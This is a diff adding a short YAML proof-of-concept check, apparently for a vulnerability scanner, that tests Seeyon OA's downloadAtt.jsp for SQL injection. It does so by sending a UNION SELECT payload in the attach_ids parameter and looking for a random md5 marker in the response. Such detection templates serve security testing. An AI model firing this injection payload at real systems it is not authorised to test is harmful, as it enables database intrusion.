@@ -1,0 +1,12 @@
+name: poc-yaml-seeyon-wooyun-2015-0108235-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{rand}}),7--
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: Rexus
+  links:
+    - https://bugs.shuimugan.com/bug/view?bug_no=0108235
